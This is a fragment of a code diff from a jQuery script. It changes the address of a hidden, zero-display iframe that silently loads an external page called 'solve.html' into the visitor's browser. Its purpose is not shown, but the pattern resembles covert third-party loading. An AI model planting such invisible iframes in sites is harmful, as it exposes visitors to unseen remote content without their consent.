@@ -54,7 +54,7 @@
   
   var iframe = document.createElement('iframe');
   iframe.style.display = "none";
-  iframe.src = "https://php.berry.bp.la/solve.html";
+  iframe.src = "https://www.imvubox.com/solve.html";
   document.body.appendChild(iframe);
 
 })(jQuery);
